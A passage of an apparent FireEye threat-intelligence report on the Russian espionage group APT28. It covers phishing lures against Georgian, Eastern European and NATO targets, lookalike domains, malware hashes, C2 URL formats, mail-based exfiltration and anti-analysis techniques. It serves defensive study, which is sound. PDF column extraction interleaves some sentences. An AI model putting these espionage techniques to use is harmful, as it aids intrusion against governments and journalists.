                                     the independent states of Georgia,             Georgian government agencies or citizens.
                             Armenia, and Azerbaijan, continues to experience       APT28 is likely seeking information on Georgia
                             political unrest. The Georgian government
s            security and diplomatic postures. Specifically,
                             posture and ties to the West are a frequent            the group has targeted the Georgian Ministry of
                             source of Moscow
s frustration, particularly after     Internal Affairs (MIA) and the Ministry of
                             the 2008 war. Overall, issues in the Caucasus          Defense (MOD). We also observed efforts to
                             likely serve as focal points for Russian               target a journalist working on issues in the
                             intelligence collection efforts.                       Caucasus and a controversial Chechen news site.
7 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                                                                                                                                  Georgian Ministry of Internal Affairs (MIA)
APT28 made at least two specific attempts to target
the Georgian Ministry of Internal Affairs.
                             APT28 Targeting of the Georgian                                                      license numbers. The backdoor attempted to
                             Ministry of Internal Affairs (MIA)                                                   establish a connection to a Georgian MIA mail
                             The MIA harbors sensitive information about the                                      server and communicate via MIA email addresses
                             inner workings of Georgia
s security operations, the                                 ending with 
@mia.ge.gov
. Once connected to the
                             country
s engagement in multilateral institutions,                                   mail server, APT28
s backdoor sent an email
                             and the government
s communications backbone. It                                     message using a subject line related to driver
                             is responsible for3:                                                                 licenses (in Georgian), and attached a file
                                                                                                                  containing system reconnaissance information.
                             
       Policing, internal security, and border patrols                             This tactic could allow APT28 to obtain data from
                             
       Counterintelligence                                                         the MIA
s network through a less-monitored
                             
       Counterterrorism                                                            route, limiting the MIA network security
                             
       International relations                                                     department
s abilities to detect the traffic.
                             
       Defense of Georgia
s strategic facilities
                                      and assets                                                                  In the second example of MIA targeting, an APT28
                             
       
Operative-Technical
 tasks                                                 lure used an information technology-themed decoy
                                                                                                                  document that included references to the Windows
                             APT28 made at least two specific attempts to                                         domain 
MIA Users\Ortachala
 (Figure 1).
                             target the MIA. In one case, we identified an                                        This probably referred to the MIA facility in the
                             APT28 lure from mid-2013 that referenced                                             Ortachala district of Tbilisi, Georgia
s capital city.
                             MIA-related topics and employed malware that                                         The decoy document also contains metadata listing
                             attempted to disguise its activity as legitimate                                     
 as the company name and 
Beka Nozadze
                             MIA email traffic. The lure consisted of a                                           as an author, a possible reference to a system
                             weaponized Excel file that presented a decoy                                         administrator in Tbilisi. The text of the document
                             document containing a list of Georgian driver
s                                      purports to provide domain and user group setup
                             3
                                 Georgian Ministry of Internal Affairs website http://police.ge/en/home
                             4
                                 Queries on the author yielded a LinkedIn page for a person of the same name who serves as a system administrator in Tbilisi.
8 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                             information for internal Windows XP and Windows    training the Georgian military. APT28 used a lure
                             7 systems. APT28 possibly crafted this document    document that installed a SOURFACE downloader
                             to appear legitimate to all MIA system users and   (further discussed in the Malware section) and
                             intended to breach the MIA network specifically    contained a listing of birthdays for members of a
                             using the embedded malware.                        working group between the Georgian MOD and
                                                                                the U.S. defense contractor. The U.S. contractor
                             APT28 Targeting of the Georgian                    was involved in a working group to advise the MOD
                             Ministry of Defense                                and Georgian Armed Forces, assess Georgia
                             APT28 also appeared to target Georgia
s MOD        military capabilities, and develop a military training
                             along with a U.S. defense contractor that was      program for the country.
   Figure 1: Georgian MIA-related decoy
9 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
   Figure 2: Excerpt of APT28
s letter to a journalist writing on Caucasus-related issues
                 We wish our cooperation will be both profitable and trusted. Our aim in the Caucasian region is
                 to help people who struggle for their independence, liberty and human rights. We all know, that
                 world is often unfair and cruel, but all together we can make it better.
                 Send your articles on this email 
 in Russian or English, please. There are some difficulties with
                 Caucasian languages, but we
ll solve the problem pretty soon, I hope.
                              Targeting journalists could provide APT28 and its sponsors
                              with a way to monitor public opinion, identify dissidents,
                              spread disinformation, or facilitate further targeting.
                              We believe that APT28
s targeting of the MOD                                      APT28 Targeting a Journalist Covering
                              aligns with Russian threat perceptions. The                                       the Caucasus
                              growing U.S.-Georgian military relationship has                                   Another one of APT28
s lures appeared to target
                              been a source of angst for Russia. Georgia and                                    a specific journalist covering issues in the
                              Russia severed diplomatic relations following the                                 Caucasus region. In late 2013, APT28 used a lure
                              Russia-Georgia War in 2008, and Georgia has                                       that contained a letter addressing a journalist by
                              since sought to align itself more closely with                                    his first name and claiming to originate from a
                              western security organizations. Additionally, in                                  
Chief Coordinator
 in Reason Magazine
                              June 2014, despite Russia
s vocal objections,                                     
Caucasian Issues Department
 - a division that
                              Georgia, along with Ukraine and Moldova, signed                                   does not appear to exist.6 (Reason Magazine is a
                              association accords with the EU.5 This move                                       US-based magazine) The letter welcomed the
                              placed all three countries more firmly in the EU
s                                individual as a contributor and requested topic
                              political, economic, and security spheres of                                      ideas and identification information in order to
                              influence. Georgian military security issues,                                     establish him at the magazine. In the background,
                              particularly with regard to U.S. cooperation and                                  the decoy document installed a SOURFACE
                              NATO, provide a strong incentive for Russian                                      backdoor on the victim
s system.
                              state-sponsored threat actors to steal information
                              that sheds light on these topics.
                              5
                                 
The EU
s Association Agreements with Georgia, the Republic of Moldova and Ukraine
. European Union Press Release Database. 23 June 2014.
                                    Web. http://e uropa.eu/rapid/press-release_MEMO-14-430_en.htm
                              6
                                   We attempted to identify candidate journalists in the country. One of these was a Georgian national of Chechen descent, whose work appears to center on
                                   Chechen and human rights issues. Ultimately, however, we cannot confirm the identity of the target(s).
10 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
 Table 1: Examples of APT28 domains imitating organizations in the Caucasus
 APT28 Domain               Real Domain
                            The Kavkaz Center / The Caucasus Center, an international Islamic news agency with coverage of
 kavkazcentr[.]info
                            Islamic issues, particularly Russia and Chechnya (kavkazcenter.com)
 rnil[.]am                  Armenian military (mil.am)
                             The body of the letter suggests that APT28 actors                                APT28
s Other Targets in the Caucasus
                             are able to read at least two languages 
 Russian                                We have seen APT28 register at least two
                             and English. The grammar of the letter also                                      domains mimicking the domains of legitimate
                             indicates that English is not the author
s first                                 organizations in the Caucasus, as shown in the
                             language, despite it purportedly originating from a                              table below. One APT28 domain imitated a key
                             US-based magazine. This implies that Russian may                                 Chechen-focused news website, while the other
                             be the APT28 author
s preferred language.                                        appeared to target members of the Armenian
                                                                                                              military by hosting a fake login page.
                             Targeting journalists could provide APT28 and its
                             sponsors with a way to monitor public opinion,                                   Of particular note, the Kavkaz Center is a
                             identify dissidents, spread disinformation, or                                   Chechen-run website designed to present an
                             facilitate further targeting. Several other nation                               alternative view to the long-running conflict
                             states are suspected of targeting journalists and                                between Russia and Chechen separatists. In
                             dissidents to monitor their activity, including China                            200410 and 2013,11 Russia
s Foreign Minister
                             and Iran.7,8 Journalists in the Caucasus working on                              voiced his displeasure that a Swedish company
                             Caucasus independence issues would be a prime                                    continues to host the Kavkaz Center website.
                             target for intelligence collection for Moscow.
                             Journalists critical of the Kremlin have long
                             been targets of surveillance and harassment,
                             and a number of governments and human
                             rights organizations have publicly criticized the
                             government for its treatment of journalists and its
                             increasing consolidation of control over the media.9
                             7
                              
 Moran, Ned, Villeneuve, Nart, Haq, Thofique, and Scott, Mike. 
Operation Saffron Rose
. FireEye. 13 May 2014. Web. http://www.fireeye.com/blog/technical/
                                malware-research/2014/05/operation-saffron-rose.html
                             8
                              
 The New York Times publicly disclosed their breach by APT12, which they assess was motivated by the China-based actors
 need to know what the
                                newspaper was publishing about a controversial topic related to corruption and the Chinese Communist Party
s leadership.
                             9
                              
Russia
. Freedom House Press Release. 2013. Web. http://www.freedomhouse.org/report/freedom-press/2013/russia#.VD8fe9R4rew
                             10
                               
Chechen website promotes terror: Lavrov
. UPI. 16 November 2014. Web. http://www.upi.com/Top_News/2004/11/16/Chechen-website-promotes-
                                terror-Lavrov/UPI-11601100627922/
                             11
                               
Lavrov urges Sweden to ban Chechen website server
 The Voice of Russia. 15 May 2013. Web. http://voiceofrussia.com/news/2013_05_15/Lavrov-urges-
                                Sweden-to-ban-Chechen-website-server/
11 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
APT28 TARGETING OF
EASTERN EUROPEAN
GOVERNMENTS AND
MILITARIES
                                                                                                            E
                                                                                                                   astern European countries
 political and
                                                                                                                   military postures are traditionally core Russian
Figure 3: Decoy MH17                                                                                               government interests. The Kremlin has long
document probably sent
                                                                                                            regarded the former Soviet Republics and satellite
to the Polish government
                                                                                                            states as in its sphere of economic, political, and
                                                                                                            military interest. Over the past two decades, as many
                                                                                                            of these states joined NATO and the EU, Russia has
                                                                                                            attempted to regain its influence in the region. Many
                                                                                                            of APT28
s targets parallel this continued focus on
                                                                                                            Eastern European governments and militaries.
                                                                                                            APT28 Targets Eastern European
                                                                                                            Government Organizations
                                                                                                            We have evidence that APT28 made at least two
                                                                                                            attempts to compromise Eastern European
                                                                                                            government organizations:
                                                                                                            
    In a late 2013 incident, a FireEye device
                                                                                                                  deployed at an Eastern European Ministry of
                                                                                                                  Foreign Affairs detected APT28 malware in
                                                                                                                  the client
s network.
                                                                                                            
    More recently, in August 2014 APT28 used a
                                                                                                                  lure (Figure 3) about hostilities surrounding a
                                                                                                                  Malaysia Airlines flight downed in Ukraine in
                                                                                                                  a probable attempt to compromise the Polish
                                                                                                                  government. A SOURFACE sample employed
                                                                                                                  in the same Malaysia Airlines lure was
                                                                                                                  referenced by a Polish computer security
                                                                                                                  company in a blog post.12 The Polish security
                                                                                                                  company indicated that the sample was 
sent
                                                                                                                  to the government,
 presumably the Polish
                                                                                                                  government, given the company
s location
                                                                                                                  and visibility.
                              12
                                   
MHT, MS12-27 Oraz *malware*.info
 Malware@Prevenity. 11 August 2014. Web. http://malware.prevenity.com/2014/08/malware-info.html
12 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
 Table 2: Examples of APT28 domains imitating legitimate Eastern European organization names
 APT28 Domain                                                   Real Domain
 standartnevvs[.]com                                            Bulgarian Standart News website (standartnews.com)
 novinitie[.]com, n0vinite[.]com                                Bulgarian Sofia News Agency website (novinite.com)
 qov[.]hu[.]com                                                 Hungarian government domain (gov.hu)
 q0v[.]pl, mail[.]q0v[.]pl                                      Polish government domain (gov.pl) and mail server domain (mail.gov.pl)
 poczta.mon[.]q0v[.]pl                                          Polish Ministry of Defense mail server domain (poczta.mon.gov.pl)
                             We have evidence that APT28 made at least two attempts
                             to compromise Eastern European government
                             organizations.
                             APT28 has registered domains similar to those of                                   This domain registration suggests that APT28
                             legitimate Eastern European news sites and                                         sought to target individuals either participating in
                             governments, listed in Table 2. These domain                                       the exercises or interested in Baltic military and
                             registrations not only suggest that APT28 is                                       security matters. Such targets would potentially
                             interested in Eastern European political affairs,                                  provide APT28 with sensitive tactical and
                             but also that the group targets Eastern European                                   strategic intelligence concerning regional military
                             governments directly.                                                              capabilities and relationships. These exercises are
                                                                                                                a particular point of interest in Moscow: pro-
                             In addition, APT28 used one domain for command                                     Kremlin press cited Russia
s interpretation of
                             and control sessions (baltichost[.]org) that was                                   these military exercises and NATO
s involvement
                             themed after the Baltic Host exercises. Baltic Host                                as a 
sign of aggression,
 and Russia
s Foreign
                             is a multinational logistics planning exercise, hosted                             Minister publicly stated that the exercise was 
                             annually since 2009 by one of the three Baltic                                     demonstration of hostile intention.
                             States (Estonia, Latvia, and Lithuania, all three of
                             which are on Russia
s border) on a rotational basis.
                             In June 2014, this event was integrated with a
                             larger U.S. Army training event, and focused on
                             exercises to improve interoperability with regional
                             allies and partners.13, 14
                             13
                               
Saber Strike and Baltic Host kick off in Latvia, Lithuania and Estonia
. Estonian Defense Forces. 9 June 2014. Web. 11 June 2014. http://www.mil.ee/en/
                                 news/8251/saber-strike-and-baltic-host-kick-off-in-latvia,-lithuania-and-estonia
                             14
                                 
Baltic Host 2014 rendering host nation support for the training audience of Exercise Saber Strike 2014 and repelling faked cyber-attacks
. Republic of
                                 Lithuania Ministry of National Defense. 12 June 2014. Web. http://www.kam.lt/en/news_1098/current_issues/baltic_host_2014_rendering_host_nation_
                                 support_for_the_training_audience_of_exercise_saber_strike_2014_and_repelling_faked_cyber-attacks.html
                             15
                                 
Tanks, troops, jets: NATO countries launch full-scale war games in Baltic
. Russia Today. 9 June 2014. Web. http://rt.com/news/164772-saber-strike-
                                 exercise-nato/
13 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
APT28 TARGETING OF
NATO AND OTHER
EUROPEAN SECURITY
ORGANIZATIONS
                             A
                                      PT28
s lures and domain registrations also                                 elections. Insider information about NATO, the
                                      demonstrate their interest in NATO and                                     OSCE and other security organizations would
                                      other European security organizations.                                     inform Russian political and military policy.
                             NATO remains a chief Russian adversary, or in the
                             words of Russia
s 2010 military doctrine, a 
main                                   Several of the domains APT28 registered imitated
                             external military danger
 particularly as it moves                                  NATO domain names, including those of NATO
                             
closer to the borders of the Russian Federation.
16                                Special Operations Headquarters and the NATO
                             As the traditional western counterweight to the                                     Future Forces Exhibition. We also observed a user
                             Soviet Union, Russia regards NATO, particularly                                     that we suspect works for NATO HQ submit an
                             NATO
s eastward expansion, as a threat to Russia
s                                  APT28 sample to VirusTotal, probably as a result
                             strategic stability. APT28 also registered a domain                                 of receiving a suspicious email.
                             name imitating the Organization for Security
                             and Cooperation in Europe (OSCE), an
                             intergovernmental organization that has cited
                             widespread fraud in numerous Russian state
                              Table 3: Examples of APT28 domains imitating legitimate NATO and security websites
                              APT28 Domain                                   Real Domain
                              nato.nshq[.]in                                 NATO Special Operations Headquarters (nshq.nato.int)
                              natoexhibitionff14[.]com                       NATO Future Forces 2014 Exhibition & Conference (natoexhibition.org)
                              login-osce[.]org                               Organization for Security and Cooperation in Europe (osce.org)
                             16
                                  The Military Doctrine of the Russian Federation, approved by Presidential edict on 5 February 2010.
14 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                                                             APT28 also demonstrated an interest in defense
                                                             attaches working in European countries. We identified
                                                             an APT28 lure containing a decoy document with a list
                                                             of British officers and U.S. and Canadian military
                                                             attach
s in London.
   Figure 4: Decoy
   document used
   against military
   attaches in 2012
                                                             Finally, APT28 used a lure that contained an apparent
                                                             non-public listing of contact information for defense
                                                             attach
s in the 
Ankara Military Attach
 Corps (AMAC),
                                                             which appears to be a professional organization of
                                                             defense attach
s in Turkey.
   Figure 5: Ankara
   Military Attache Corps
   decoy document
15 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                             APT28 Targets European                                SMi Group, a company that plans events for the
                             Defense Exhibitions                                   
Defence, Security, Energy, Utilities, Finance and
                             In addition to targeting European security            Pharmaceutical sectors.
 Among other events, the
                             organizations and governments, it appears that        SMi Group is currently planning a military satellite
                             APT28 is targeting attendees of European              communications event for November 2014.
                             defense exhibitions. Some of the APT28-
                             registered domains imitated those of defense          Targeting organizations and professionals
                             events held in Europe, such as the Farnborough        involved in these defense events would likely
                             Airshow 2014, EuroNaval 2014, EUROSATORY              provide APT28 with an opportunity to procure
                             2014, and the Counter Terror Expo. In September       intelligence pertaining to new defense
                             2014, APT28 registered a domain (smigroup-            technologies, as well as the victim organizations
                             online.co[.]uk) that appeared to mimic that for the   operations, communications, and future plans.
                                                                                   Targeting organizations and
                                                                                   professionals involved in
                                                                                   these defense events would
                                                                                   likely provide APT28 with an
                                                                                   opportunity to procure
                                                                                   intelligence pertaining to
                                                                                   new defense technologies.
16 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
OTHER APT28 TARGETS
ARE CONSISTENT
WITH NATION STATE
INTERESTS
         PT28 has targeted a variety of organizations
                                                             INTERNATIONAL ORGANIZATION
         that fall outside of the three themes we
         highlighted above. However, we are not
profiling all of APT28
s targets with the same               European Commission
detail because they are not particularly indicative
of a specific sponsor
s interests. They do indicate          UN Office for the Coordination of Humanitarian Affairs
parallel areas of interest to many governments
and do not run counter to Russian state interests.
                                                             APEC
Other probable APT28 targets that we have
identified:                                                  NATO
   Norwegian Army (Forsvaret)
                                                             OSCE
   Government of Mexico
   Chilean Military
   Pakistani Navy                                          World Bank
   U.S. Defense Contractors
   European Embassy in Iraq
   Special Operations Forces Exhibition (SOFEX)
                                                             OTHER
     in Jordan
   Defense Attaches in East Asia
   Asia-Pacific Economic Cooperation (APEC)                Hizb ut-Tahir
   Al-Wayi News Site
                                                             Chechnya Global
 KEY
 APT28 Registered Domains
                                                             Diplomatic Forum
 Lure Document
                                                             Military Trade Shows
 Phishing Email
17 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                                                                                         HUNGARIAN GO
                                                                                                                  IVERSITY
                                                                  NOR
                                                                                                                                               T
                                                                                                                                            MEN
                                                      UK
                                                                                                                                                            ER
                                                                     WEG
                                                         DE
                                                                                                                                         ERN
                                                                                                                                                         NT
                                                                                                                        UN
                                                           FEN
                                                                                                                                                                      FA
                                                                        IAN M
                                                                                                                                                      CE
                                                                                                                                     GOV
                                                                                                                                                                      M
                                                                                                               CROATIAN
                                                              S
                                                                                                                                                   AZ
                                                                                                                                                                   KI
                                                           EA
                                                                                                                                                                 BE
                                                                                                      VERNME
                                                                             ILITA
                                                                                                                                                 VK
                                                                                                                                ISH
                                                                                                                                                                                      Y
                                                             TTA
                                                                                                                                                             UZ
                                                                                                                                                                                    AR
                                                                                                                                               KA
                                                                                                                               POL
                                                                                                                                                                                  IT
                                                                           RY
                                                                CH
                                                                                                                                                                                IL
                                                                                                                                                                               M
                                                                  ES
                                                                                                                                                                            N
                                                                                                                                                                                                           NT
                                                                                                NT
                                                                                                                                                                          IA
                                                                                                                                                                                                        ME
                                                                                                                                                                    EN
                                                                                                                                                                                                  N
                                                                                                                                                                   M
                                                                                                                                                                                               ER
                                                                                                                                                                 AR
                                                                                                                                                                                              V
                                                                                                                                                                                         GO
                                                                                                                                                                                    N
                                                                                                                                                                                GIA
                                                                                                                                                                                                                     LE
                                                                                                                                                                          OR                                 TIC
                                                                                                                                                                      GE                             S     AR
                                                                                                                                                                                                  EW
              CAN                                                                                                                                                                            TN
                  ADI
                         AN                                                                                                                                                       P     RIO
                              DEF                                                                                                                                              CY
                                 ENS
                                      E AT
                                            TAC
                                                HES
                                                                                                                                                                                                                     JAPAN
                                                                                                                                                                                                  TACHES IN
                                                                                                                                                                          DEFENSE AT
          US DEFENSE ATTACHES AND US DEFENSE CONTRACTORS
                                                                                                                                                             DEFENSE ATTA
                                                                                                                                                                                        CHES IN SOUTH
                                                                                                                                                                                                                     KOREA
                                                                                                                                                                           DEFE
                                    NMENT                                                                                                                                            NSE A
                    AN   GOVER                                                                                                                                                            TTAC
           MEXIC                                                                                                                                                                                           HES IN
                                                                                                                                                                                                                     CHIN
                                                                                                                                                                                                                          A
                                                                                                                                                                   EU           EM
                                                                                                                                                                      RO             IRA
                                                                                                                                                                           PE           TI
                                                                                                                                                                                               NE
                                                                                                                                                                               AN                  WS
                                                                                                                                                                                     EM                    WE
                                                                                                                                                                                         BA                     BS
                                                                                                                                                                          IR                  SS                  ITE
                                                                                                                                                                            AN                    Y
                                                                                                                                            DE
                                                                                                                                                                                IA                    IN
                                                                                                                                                                                    N                      IR
                                                                                                                                              FE
                                                                                                                                                                                                             AQ
                                                                                                                                                         AF
                                                                                                                                                                                        AC
                                                                                                                                                                   PA
                                                 Y
                                                                                                                                     BUL
                                                                                     O (MFA)
                                               AR
                                                                                                                                                   NS
                                                                                                                                                                                          AD
                                                                                                                                                          GH
                                                                                                                                                                      K AS
                                             IT
                                                                                                                                                                                              EM
                                                                                                                                                   EA
                                                                                                                                        GAR
                                                                                                                                                             AN
                                            IL
                                                                                                                                                                          TA
                                                                                                                                                                                                   IC
                                           M
                                                                                                                                                     TTA
                                                                                                                                                                 IN
                                                                                                                                                                             N
                                                                                                                                                                                                      S
                                       AN
                                                                                                                                                                                IM
                                                                                                                                          IAN
                                                                               ICAN DIRC
                                                                                                                                                                  EW
                                                                                                                                                        CH
                                     LE
                                                                                                                                                                                  IL
                                                                                                                                                                                        IT
                                                                                                                                                                    S
                                       I
                                                                                                                                            NEW
                                    CH
                                                                                                                                                         ES
                                                                                                                                                                                          AR
                                                                                                                                                                      W
                                                                                                                                                                                            Y
                                                                                                                                                                        EB
                                                                                                                                                           IN
                                                                                                                        UGANDA
                                                                                                                                              SW
                                                                                                                                                                          SI
                                                                                                                                                             TU
                                                                                                                                                                           TE
                                                                             SOUTH AFR
                                                                                                                                                                 RK
                                                                                                                                                   EBS
                                                                                                                                                                 EY
                                                                                                                                                   ITES
                                                                                                                             N NGO
 KEY
 APT28 Registered Domains
 Lure Document
 Phishing Email
18 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
Our analysis of some of the group
s more
commonly used tools indicates that APT28
has been systematically updating their
malware since 2007.
APT28 MALWARE INDICATES
SKILLED RUSSIAN
DEVELOPERS
                             A
                                     PT28
s tools are suggestive of the group
s      
   SOURFACE: This downloader is typically
                                     skills, ambitions, and identity. Our analysis        called Sofacy within the cyber security
                                     of some of the group
s more commonly                 community. However because we have
                             used tools indicates that APT28 has been                     observed the name 
Sofacy
 used to refer to
                             systematically updating their tools since 2007.              APT28 malware generally (to include the
                             APT28 is most likely supported by a group of                 SOURFACE dropper, EVILTOSS,
                             developers creating tools intended for long-term             CHOPSTICK, and the credential harvester
                             use and versatility, who make an effort to                   OLDBAIT), we are using the name
                             obfuscate their activity. This suggests that APT28           SOURFACE to precisely refer to a specific
                             receives direct ongoing financial and other                  downloader. This downloader obtains a
                             resources from a well-established organization,              second-stage backdoor from a C2 server.
                             most likely a nation state government. APT28
s               CORESHELL is an updated version of
                             malware settings suggest that the developers                 SOURFACE.
                             have done the majority of their work in a Russian       
   EVILTOSS: This backdoor has been delivered
                             language build environment during Russian                    through the SOURFACE downloader to gain
                             business hours, which suggests that the Russian              system access for reconnaissance,
                             government is APT28
s sponsor.                               monitoring, credential theft, and shellcode
                                                                                          execution.
                             Some of APT28
s more commonly used tools are            
   CHOPSTICK: This is a modular implant
                             the SOURFACE downloader, its second stage                    compiled from a software framework that
                             backdoor EVILTOSS, and a modular family of                   provides tailored functionality and flexibility.
                             implants that we call CHOPSTICK.
19 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                             A number of the malware variants that we profile     
   One of the latest samples of CORESHELL
                             below, especially the CHOPSTICK family,                   includes counter-reverse engineering tactics
                             demonstrate formal coding practices indicative of         via unused machine instructions. This would
                             methodical, diligent programmers. The modularity          hinder static analysis of CORESHELL behavior
                             of CHOPSTICK alone, with its flexible and lasting         by creating a large amount of unnecessary
                             platform, demonstrates planning for long-term             noise in the disassembly.
                             use and versatility. We have also noted that         
   A number of CORESHELL droppers also
                             APT28 tailors implants to their target                    conduct runtime checks, attempting to
                             environments, configuring them to use local               determine if they are executing in an analysis
                             network resources such as email servers.                  environment, and if so, they do not trigger
                                                                                       their payloads.
                             APT28 has attempted to obfuscate their code and      
   Many samples across the SOURFACE/
                             implement counter-analysis techniques:                    CORESHELL, CHOPSTICK, and EVILTOSS
   Figure 6: Typical deployment of SOURFACE ecosystem
                           Spearphishing Email
                         Document with exploit
                             Dropper malware
                        SOURFACE downloader                                      Obtains 2nd stage              C2 Server
                     Deploys 2nd stage droppers
                             2nd stage implant
20 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
                                   malware families obfuscate strings that are       APT28 has made incremental and systematic
                                   decoded at runtime. Two of the malware            changes to the SOURFACE downloader and its
                                   families (SOURFACE/CORESHELL and                  surrounding ecosystem since as early as 2007.
                                   EVILTOSS) use the same decryption                 These changes indicate a long-standing and
                                   sequence and similar algorithms for string        dedicated development effort behind APT28. We
                                   encoding and decoding. These families             have observed samples of the SOURFACE
                                   encode their strings at compile time using a      downloader compiled between 2007 and 2014.
                                   custom stream cipher. From a high level,          We call SOURFACE (samples are frequently
                                   these ciphers share a similar design across       named netids.dll) a first stage downloader
                                   the malware families but differ slightly in the   because its primary job is to retrieve a second
                                   internal arithmetic operations.                   stage payload from a C2 server. Until 2013, the
                             
    APT28 has employed RSA encryption to              SOURFACE downloader used hard-coded IP
                                   protect files and stolen information moved        addresses for C2 communications, whereas the
                                   from the victim
s network to the controller.      future CORESHELL samples use domains.
EVOLUTION OF
SOURFACE ECOSYSTEM
INDICATES SYSTEMATIC DEVELOPMENT
WHAT IS A MALWARE ECOSYSTEM?
First, a malware family is a collection of malware in which each sample shares a significant
amount of code with all of the others. There are exceptions: for example, some files
contain public and standard code libraries that we do not take into consideration
when making a family determination.
A malware ecosystem is a group of malware families that work together to perform
the same objective. Perhaps the simplest and most typical ecosystem
is a dropper and a backdoor that are used together. They may not share the
same code structure, but they are related because one drops and installs
the other.
The ecosystem surrounding the SOURFACE downloader frequently
consists of a dropper, which installs SOURFACE. The SOURFACE
downloader then receives another dropper from its C2 server, and
this second dropper installs a second stage backdoor, which is
usually EVILTOSS.
21 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
In April 2013, based on compile time, the group
began to make significant alterations to the                                 Figure 7: Example of modified SOURFACE vs. CORESHELL communications
SOURFACE downloader. They started by
changing the compiled DLL name to 
coreshell.dll
and making minor changes to the network
communications, as seen in Figure 7.                                         SOURFACE URL for a sample compiled April 2013:
                                                                             http://[hostname]/~book/cgi-bin/brvc.cgi?WINXPSP3c95b87a4-05_01
The hostname, volume serial number and OS
version data are encoded in the new URL format.                              CORESHELL URL for a sample compiled April 2013:
As seen in the table below, the SOURFACE/                                    http://[hostname]/~xh/ch.cgi?enhkZm1GNmY1YWg0eGcxMGQ1MDUwMQ==
CORESHELL developers also made other
modifications that changed the exported function
name and file size over time.
 Table 4: Evolution of SOURFACE downloader over time
 MD5                                                        Size             Compile Date                                        Export Name                    Notes
 272f0fde35dbdfccbca1e33373b3570d                           11264            2013-04-16 10:49:25 UTC                             Init1                          17
 8b92fe86c5b7a9e34f433a6fbac8bc3a                           14848            2013-08-06 07:53:03 UTC                             Initialize                     18
 9eebfebe3987fec3c395594dc57a0c4c                           12800            2013-08-14 10:48:59 UTC                             Initialize                     19
 da2a657dc69d7320f2ffc87013f257ad                           12800            2013-08-21 07:52:10 UTC                             Initialize                     Same as previous.
 1259c4fe5efd9bf07fc4c78466f2dd09                           12800            2013-10-03 09:21:10 UTC                             Initialize                     Same as previous.
 3b0ecd011500f61237c205834db0e13a                           43520            2014-02-13 16:29:36 UTC                             Applicate                      20
 5882fda97fdf78b47081cc4105d44f7c                           45056            2014-05-13 15:18:24 UTC                             Applicate                      21
 791428601ad12b9230b9ace4f2138713                           45056            2014-05-13 16:42:26 UTC                             Applicate                      Same as previous.
 ead4ec18ebce6890d20757bb9f5285b1                           45056            2014-07-25 15:44:04 UTC                             Applicate                      Same as previous.
 48656a93f9ba39410763a2196aabc67f                           112640           2014-07-30 11:13:24 UTC                             Applicate                      22
 8c4fa713c5e2b009114adda758adc445                           112640           2014-07-30 11:13:24 UTC                             Applicate                      Same as previous.
                             17
                                SOURFACE with minor changes to network communications (see Figure 7).
                             18
                                Basic anti-debug measures added (process listing, rand timing, is DebuggerPresent).
                             19
                                Switches from loading a secondary DLL (netui.dll/WinIDS.dll) to uploading the contents of %temp%\chkdbg.log.
                             20
                                Statically links msvcrt library.
                             21
                                Statically links msvcrt library and the strings used to identify the imported libraries and functions are reversed prior to being used, then reversed back after use.
                             22
                                This version added assembly level obfuscation, which slows down analysis. This variant requires the OS to be at least Windows Vista.
22 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
In April 2013, based on compile time, the
group began to make significant alterations to
the SOURFACE downloader.
   Figure 8: NATO-themed decoy
   delivered with possible EVILTOSS
   predecessor from 2004
                              Variants of the SOURFACE second stage                                                Interestingly, we found an antivirus report from
                              backdoor, EVILTOSS, share some code similarities                                     200423 detailing what appears to be an early
                              with SOURFACE. However, it contains more                                             variant of EVILTOSS. The backdoor was installed
                              capabilities, including the ability to provide access                                alongside the NATO-themed decoy document
                              to the file system and registry, enumerate network                                   depicted in Figure 8. The backdoor sent data via
                              resources, create processes, log keystrokes, access                                  SMTP to nato_smtp@mail[.]ru and received its
                              stored credentials, and execute shellcode. The                                       tasking via POP from nato_pop@mail[.]ru.
                              backdoor encrypts data that it uploads with an RSA                                   Although we have not conclusively attributed
                              public key. Many of its variants we have seen are                                    this sample to APT28, it does suggest the
                              named netui.dll. EVILTOSS variants may use the                                       possibility that APT28 has been operating since
                              Simple Mail Transfer Protocol (SMTP) to send                                         as early as 2004.24
                              stolen data in an attachment named 
detaluri.
                              dat
. The backdoor attaches this file to a
                              preformatted email and sends it out through a
                              victim
s mail server.
                              23
                                     http://ae.norton.com/security_response/print_writeup.jsp?docid=2004-081915-1004-99
                              24
                                    Although the malware family and interest in NATO make it likely that APT28 was involved, we cannot conclusively attribute this sample to APT28 based on
                                    these factors alone. We have no evidence that they controlled the C2 for this malware or were using EVILTOSS in 2004. APT28 could have possibly obtained
                                    this source code from another group of actors. Also, malware can be passed from group to group. The other malware that we associate with APT28 in this
                                    paper is more strongly attributed to the group using additional factors, some of which we mention in Appendix A.
23 fireeye.com
APT 28: A Window into Russia
s Cyber Espionage Operations?
MODULAR IMPLANTS
INDICATE A FORMAL
DEVELOPMENT
ENVIRONMENT
A modular development framework                                                    CHOPSTICK variants may move messages and
                                                                                   information using at least three methods:
suggests the group has had an organized
development effort since as early as 2007.                                         1.
   Communications with a C2 server using
                                                                                         HTTP. These protocols are covered in more
                                                                                         detail in Appendix D.
                                                                                   2.
   Email sent through a specified mail server.
                                                                                         One CHOPSTICK v1 variant contained
                             D
                                      uring our research, we discovered that             modules and functions for collecting
                                      APT28 uses a backdoor developed using a            keystroke logs, Microsoft Office documents,
                                      modular framework. We call this                    and PGP files. The monitoring for new files of
                             backdoor CHOPSTICK, a somewhat ironic name                  interest is performed by a 
Directory
                             that comes from our semi-random name                        Observer
 module. In one sample this
                             generator. The modular design allows flexible               information was intended to be sent via
                             options for compiling variants with different               SMTP using a Georgian MIA mail server. It
